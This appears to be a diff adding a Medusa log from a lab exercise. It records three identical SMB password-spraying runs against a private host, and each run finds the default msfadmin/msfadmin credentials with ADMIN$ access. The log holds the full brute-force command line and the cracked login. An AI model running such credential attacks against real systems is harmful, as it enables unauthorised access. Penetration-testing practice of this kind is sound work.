@@ -1,0 +1,12 @@
+# Medusa v.2.3 (2026-11-16 20:38:35)
+# medusa -h 192.168.56.101 -U smb_users.txt -P pass.txt -M smbnt -t 6 -O smd_spraying.log 
+2026-11-16 20:38:36 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-11-16 20:38:37).
+# Medusa v.2.3 (2026-11-16 20:40:32)
+# medusa -h 192.168.56.101 -U smb_users.txt -P pass.txt -M smbnt -t 6 -O smd_spraying.log 
+2026-11-16 20:40:32 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-11-16 20:40:33).
+# Medusa v.2.3 (2026-11-16 20:40:40)
+# medusa -h 192.168.56.101 -U smb_users.txt -P pass.txt -M smbnt -t 6 -O smd_spraying.log 
+2026-11-16 20:40:40 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-11-16 20:40:41).
